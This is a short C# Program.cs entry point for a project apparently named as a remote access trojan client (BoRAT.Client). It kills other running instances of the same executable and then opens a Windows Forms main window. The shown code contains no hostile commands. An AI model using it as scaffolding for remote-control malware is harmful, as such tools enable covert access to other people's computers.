using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace BoRAT.Client
{
    internal static class Program
    {
        /// <summary>
        ///     The main entry point for the application.
        /// </summary>
        [STAThread]
        private static void Main()
        {
            var processes = Process.GetProcessesByName(
                Path.GetFileNameWithoutExtension(Assembly.GetEntryAssembly().Location));

            var currentPID = Process.GetCurrentProcess().Id;

            foreach (var pr in processes)
                if (pr.Id != currentPID)
                    pr.Kill();

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new frmMain());
        }
    }
}